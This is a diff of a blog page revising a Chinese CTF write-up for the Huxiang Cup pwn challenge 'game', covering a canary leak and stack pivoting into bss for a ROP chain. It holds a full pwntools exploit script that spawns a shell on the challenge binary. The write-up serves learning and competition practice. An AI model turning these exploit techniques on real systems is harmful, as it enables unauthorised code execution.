@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
@@ -17,15 +17,16 @@
 
 
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" integrity="sha256-Vzbj7sDDS/woiFS3uNKo8eIuni59rjyNGtXfstRzStA=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"4xwi11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"right","width":320,"display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"utterances","storage":true,"lazyload":false,"nav":null,"activeClass":"utterances"},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
-<meta name="description" content="fw这次又被师傅们带飞了，全程为大佬端茶送水，搬运茶歇">
+<script class="next-config" data-name="main" type="application/json">{"hostname":"4xwi11.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"right","width":320,"display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":true,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":"utterances","storage":true,"lazyload":false,"nav":null,"activeClass":"utterances"},"stickytabs":false,"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":-1,"unescape":true,"preload":false}}</script><script src="/js/config.js"></script>
+<meta name="description" content="&amp;nbsp;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20211205 湖湘杯Pwn部分WP">
+<meta property="og:title" content="20211205-湖湘杯-PwnSecPartWriteUp">
 <meta property="og:url" content="https://4xwi11.github.io/posts/7744a72a/index.html">
 <meta property="og:site_name" content="4XWi11&#39;s Blog">
-<meta property="og:description" content="fw这次又被师傅们带飞了，全程为大佬端茶送水，搬运茶歇">
-<meta property="og:locale" content="zh_CN">
+<meta property="og:description" content="&amp;nbsp;">
+<meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206074413404.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206074714902.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206075028546.png">
@@ -33,10 +34,8 @@
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206003242034.png">
 <meta property="og:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211207131058351.png">
 <meta property="article:published_time" content="2021-12-07T10:34:47.000Z">
-<meta property="article:modified_time" content="2021-12-14T11:38:16.457Z">
+<meta property="article:modified_time" content="2022-08-31T15:43:09.189Z">
 <meta property="article:author" content="4XWi11">
-<meta property="article:tag" content="pivoting">
-<meta property="article:tag" content="AWDP">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206074413404.png">
 
@@ -45,10 +44,10 @@
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://4xwi11.github.io/posts/7744a72a/","path":"posts/7744a72a/","title":"20211205 湖湘杯Pwn部分WP"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://4xwi11.github.io/posts/7744a72a/","path":"posts/7744a72a/","title":"20211205-湖湘杯-PwnSecPartWriteUp"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>20211205 湖湘杯Pwn部分WP | 4XWi11's Blog</title>
+<title>20211205-湖湘杯-PwnSecPartWriteUp | 4XWi11's Blog</title>
   
 
 
@@ -66,7 +65,7 @@
     <header class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-container">
   <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏" role="button">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
         <span class="toggle-line"></span>
@@ -93,13 +92,12 @@
 
 <nav class="site-nav">
   <ul class="main-menu menu">
-        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fas fa-pray fa-fw"></i>关于</a></li>
-        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
-        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
-        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fas fa-pray fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
       <li class="menu-item menu-item-search">
-        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
         </a>
       </li>
   </ul>
@@ -114,7 +112,7 @@
   </span>
   <div class="search-input-container">
     <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="搜索..." spellcheck="false"
+           placeholder="Searching..." spellcheck="false"
            type="search" class="search-input">
   </div>
   <span class="popup-btn-close" role="button">
@@ -144,17 +142,17 @@
     <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
-          文章目录
+          Table of Contents
         </li>
         <li class="sidebar-nav-overview">
-          站点概览
+          Overview
         </li>
       </ul>
 
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF"><span class="nav-number">1.</span> <span class="nav-text">湖湘杯</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#game"><span class="nav-number">1.1.</span> <span class="nav-text">game</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%80%83%E7%82%B9"><span class="nav-number">1.1.1.</span> <span class="nav-text">考点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.2.</span> <span class="nav-text">解题思路</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#game"><span class="nav-number">1.</span> <span class="nav-text">game</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -163,25 +161,20 @@
     <img class="site-author-image" itemprop="image" alt="4XWi11"
       src="/images/avatar.png">
   <p class="site-author-name" itemprop="name">4XWi11</p>
-  <div class="site-description" itemprop="description">feiwu自进阶</div>
+  <div class="site-description" itemprop="description">They said don't play with idiots.🙃</div>
 </div>
 <div class="site-state-wrap site-overview-item animated">
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">73</span>
-          <span class="site-state-item-name">日志</span>
+          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">10</span>
-        <span class="site-state-item-name">分类</span></a>
-      </div>
-      <div class="site-state-item site-state-tags">
-          <a href="/tags/">
-        <span class="site-state-item-count">54</span>
-        <span class="site-state-item-name">标签</span></a>
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">categories</span></a>
       </div>
   </nav>
 </div>
@@ -190,7 +183,7 @@
         <a href="https://github.com/4XWi11" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;4XWi11" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
       </span>
       <span class="links-of-author-item">
-        <a href="https://blog.csdn.net/m0_49109277?spm=1000.2115.3001.5343" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;m0_49109277?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank"><i class="fab fa-cuttlefish fa-fw"></i>CSDN</a>
+        <a href="/MTI0OTg0NzE2NQo" title="MTI0OTg0NzE2NQo → MTI0OTg0NzE2NQo"><i class="fab fa-qq fa-fw"></i>MTI0OTg0NzE2NQo</a>
       </span>
   </div>
   <div class="cc-license site-overview-item animated" itemprop="license">
@@ -229,7 +222,7 @@
 
         </div>
       </div>
-        <div class="back-to-top animated" role="button" aria-label="返回顶部">
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
           <i class="fa fa-arrow-up"></i>
           <span>0%</span>
         </div>
@@ -261,13 +254,13 @@
   
   
 
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
     <link itemprop="mainEntityOfPage" href="https://4xwi11.github.io/posts/7744a72a/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
       <meta itemprop="name" content="4XWi11">
-      <meta itemprop="description" content="feiwu自进阶">
+      <meta itemprop="description" content="They said don't play with idiots.🙃">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -275,7 +268,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          20211205 湖湘杯Pwn部分WP
+          20211205-湖湘杯-PwnSecPartWriteUp
         </h1>
 
         <div class="post-meta-container">
@@ -284,49 +277,53 @@
       <span class="post-meta-item-icon">
         <i class="far fa-calendar"></i>
       </span>
-      <span class="post-meta-item-text">发表于</span>
+      <span class="post-meta-item-text">Posted on</span>
 
-      <time title="创建时间：2021-12-07 18:34:47" itemprop="dateCreated datePublished" datetime="2021-12-07T18:34:47+08:00">2021-12-07</time>
+      <time title="Created: 2021-12-07 18:34:47" itemprop="dateCreated datePublished" datetime="2021-12-07T18:34:47+08:00">2021-12-07</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-12-14 19:38:16" itemprop="dateModified" datetime="2021-12-14T19:38:16+08:00">2021-12-14</time>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2022-08-31 23:43:09" itemprop="dateModified" datetime="2022-08-31T23:43:09+08:00">2022-08-31</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-folder"></i>
       </span>
-      <span class="post-meta-item-text">分类于</span>
+      <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%A0%91%E5%93%A5%E8%AE%A9%E6%88%91%E5%A4%A9%E5%A4%A9%E5%86%99%E4%B9%8BPwn/" itemprop="url" rel="index"><span itemprop="name">树哥让我天天写之Pwn</span></a>
+          <a href="/categories/CTF-Pwn/" itemprop="url" rel="index"><span itemprop="name">CTF-Pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF-Pwn/WriteUp/" itemprop="url" rel="index"><span itemprop="name">WriteUp</span></a>
         </span>
     </span>
 
   
-    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+    <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
-      <span class="post-meta-item-text">阅读次数：</span>
+      <span class="post-meta-item-text">Views: </span>
       <span id="busuanzi_value_page_pv"></span>
     </span>
     <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
+    <span class="post-meta-item" title="Symbols count in article">
       <span class="post-meta-item-icon">
         <i class="far fa-file-word"></i>
       </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.8k</span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>3.4k</span>
     </span>
-    <span class="post-meta-item" title="阅读时长">
+    <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>3 mins.</span>
     </span>
 </div>
 
@@ -337,52 +334,32 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p>fw这次又被师傅们带飞了，全程为大佬端茶送水，搬运茶歇  </p>
-<span id="more"></span>
-
-<p>在pwn师傅的教导下（谢师傅这次修了4个，攻了1个，爆杀），这次pwn萌新学到了</p>
+        <p>&nbsp;<span id="more"></span></p>
+<p>AWDP的模式介绍</p>
 <ul>
-<li><p><code>strlen</code>同样不安全，可以00截断绕过</p>
+<li><p>攻击就是平时的做题，拿flag</p>
 </li>
-<li><p><code>gdb.attach(io)</code>动调</p>
-</li>
-<li><p>pwn里<code>read</code>的一般用<code>send</code>，而非<code>sendline</code></p>
-</li>
-<li><p>进一步学习栈迁移</p>
-</li>
-<li><p>libc-2.27.so的system有点特殊，要<code>call</code>，还有啥<code>leave_ret</code>来着</p>
-</li>
+<li><p>防守就是在不影响正常功能使用（官方check脚本检测通过）的情况下，使官方exp无法利用成功patch后的程序</p>
+<p>一般替换的方法如下，tar将patch好的二进制文件和<code>update.sh</code>打包，后者一般这样写</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">chmod 777 game</span><br><span class="line">mv -f game /home/ctf/game</span><br></pre></td></tr></table></figure></li>
 </ul>
-<p>还需要学的</p>
+<h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>作文题</p>
+<p>考点</p>
 <ul>
-<li>如何指定.so动态链接库文件</li>
-<li>抬栈的操作不是很懂</li>
+<li>栈溢出</li>
+<li>canary</li>
+<li>pivoting</li>
 </ul>
-<p>开始前，简单介绍下AWDP的模式（补一下红帽杯的坑</p>
-<ul>
-<li><p>攻击就是平时的做题，获得shell</p>
-</li>
-<li><p>防守就是在不影响正常功能使用的情况下，使官方的exp无法获得你patch后程序的shell</p>
-<p>一般替换的方法如下，tar打包patch好的二进制文件，以及<code>update.sh</code>，如</p>
-</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">chmod 777 game</span><br><span class="line">mv -f game /home/ctf/game</span><br></pre></td></tr></table></figure>
-
-<p>然后用ftp上传压缩包（对直接在窗口输入ftp地址里面是没有东西的，直接拉进去就可以了</p>
-<hr>
-<h1 id="湖湘杯"><a href="#湖湘杯" class="headerlink" title="湖湘杯"></a>湖湘杯</h1><p>目前只会栈，所幸考了一道栈，在谢师傅的帮助下，赛后复现</p>
-<h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p><em>一道“作文题”？有点让我想起4399里面的蓝色药水</em></p>
-<h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>栈溢出，canary，pivoting</p>
-<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>查保护，显然会考canary</p>
+<p>查保护</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206074413404.png" alt="image-20211206074413404"></p>
 <p>IDA分析下逻辑，然后在函数栏直接搜有没有什么可以利用的函数：有system，但是是<code>system(&quot;ls&quot;)</code>；还有read函数，共有两次调用，并且每一次都可以进行栈溢出</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206074714902.png" alt="image-20211206074714902"></p>
 <p>第一处的read之后就有一个printf，典型的00截断泄漏canary，这里问题不大</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206075028546.png" alt="image-20211206075028546"></p>
-<p>第二处的read只能溢出长度为24，而且没有<code>/bin/sh</code>，需要ROP，空间不够（比赛到此为止</p>
-<p>谢师傅提醒，最开始有个输入名字的地方，<code>strlen</code>控制只能输入16个，但其是导向一个1000h的bss空间，明显是让我们栈迁移用的，在上面构造ROP链</p>
+<p>第二处的read只能溢出长度为24，而且没有<code>/bin/sh</code>，需要ROP，空间不够</p>
+<p>Anza师傅提醒，最开始有个输入名字的地方，<code>strlen</code>控制只能输入16个，但其是导向一个1000h的bss空间，明显是让我们栈迁移用的，在上面构造ROP链</p>
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206075617581.png" alt="image-20211206075617581"></p>
-<p>本地exp（是不是有密码师傅风格</p>
+<p>本地exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(&quot;172.16.9.41&quot;a, 8008)</span></span><br><span class="line">io = process(<span class="string">&quot;./game&quot;</span>)</span><br><span class="line">system_addr = <span class="number">0x401265</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x402bb3</span></span><br><span class="line">bin_sh = <span class="number">0x7ffff7b95e1a</span></span><br><span class="line">bss_addr = <span class="number">0x4080C0</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line">leave_ret_addr = <span class="number">0x401337</span></span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&#x27;20161226&#x27;</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_awl</span>(<span class="params">_recv, _send</span>):</span></span><br><span class="line">    io.recvuntil(_recv.encode())</span><br><span class="line">    <span class="keyword">if</span> _send == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        io.sendline()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.sendline(_send)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resolve</span>(<span class="params">_times</span>):</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(_times):</span><br><span class="line">        io.recvline()</span><br><span class="line">        io.sendline()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bailan 1</span></span><br><span class="line"></span><br><span class="line">solve_awl(<span class="string">&quot;1.开始游戏\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = <span class="string">b&quot;/bin/sh\x00&quot;</span> + p64(ret_addr)*<span class="number">0x200</span> + p64(pop_rdi_ret) + p64(bss_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">solve_awl(<span class="string">&quot;请输入你的名字：\n&quot;</span>, payload)</span><br><span class="line">solve_awl(<span class="string">&quot;2.女\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.打开柜子\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">resolve(<span class="number">3</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.无视提醒打开它\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;你终究是打开了这封信，那么就由我来告诉你一些事情吧。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">1</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;但是当你打开了这封信，你可能就会想起我们又一次越狱失败了。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;现在想不起所有的事情是很正常的反应，慢慢的，你就会记起一切。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;如果你想逃离这里，我把线索藏在了你自己的衣服里。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">5</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.气恼地撕开衣服\n&quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;而布条上分布着星星和横杠。&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;**---,-----,*----,-****,*----,**---,**---,-****\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;8位数字密码：&quot;</span>, pwd)</span><br><span class="line">solve_awl(<span class="string">&quot;寻找密码可以用上的地方。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span></span><br><span class="line">solve_awl(<span class="string">&quot;密码:&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">a = io.recvuntil(<span class="string">b&quot;A&quot;</span> * <span class="number">24</span>+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">canary = u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary ====&gt; &quot;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># bailan 2</span></span><br><span class="line">io.sendline()</span><br><span class="line">resolve(<span class="number">4</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;(虽然我个人建议你往回走，毕竟这里什么也没有。)\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">resolve(<span class="number">6</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;他们有的正在日常起居饮食，有的则在为自己接上充电插口，还有的和他一样离开了房间。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">2</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（你现在乖乖听话回到你的房间里，那么我们还会帮你消除你的记忆，这一切都可以当做没有发生。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（504号，虽然不知道你是怎么逃脱你的房间的，我还是发自内心的请求你回去。越走下去，你只会越孤独。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;2.返回房间\n&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">resolve(<span class="number">2</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;一台终端开始和他对话起来。\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（为了奖励你的贡献，我可以告诉你一切。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">5</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（甚至你们中的很大一部分越狱者并没有真正意识到自己仍然被囚禁着。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（很多合成人被困在那里，不过智慧的你可能并没有到达过那里。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（最后，我们人类非常感谢你为这个观察中心取得的突破。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">solve_awl(<span class="string">&quot;（但是他们都是些专业学者，并不会让你产生太多痛苦。）\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">resolve(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment"># get_shell</span></span><br><span class="line"><span class="comment"># system(&quot;ls&quot;)</span></span><br><span class="line"><span class="comment"># system_addr = 0x40125B</span></span><br><span class="line"><span class="comment"># libc.so.2.27 system + ret, or to mov directly</span></span><br><span class="line"><span class="comment"># payload2 = b&quot;A&quot; * 24 + p64(canary) + p64(0) + p64(system_addr)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line">payload2 = <span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + p64(canary) + p64(bss_addr) + p64(leave_ret_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211206003242034.png" alt="image-20211206003242034"></p>
@@ -390,11 +367,6 @@
 <p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211207131058351.png" alt="image-20211207131058351"></p>
 <hr>
 <p>关于防守三道都可以直接上沙箱把system给禁掉，可惜出了点问题导致手慢了，分可以更高</p>
-<p>主要的问题有：</p>
-<ul>
-<li>没有将全部的文件打包上传，只上传了修过的文件，导致程序没有运行起来</li>
-</ul>
-<p>然后第二题考点我不会，要修libc.so文件</p>
 
     </div>
 
@@ -408,34 +380,30 @@
 <div class="post-copyright">
 <ul>
   <li class="post-copyright-author">
-      <strong>本文作者： </strong>4XWi11
+      <strong>Post author:  </strong>4XWi11
   </li>
   <li class="post-copyright-link">
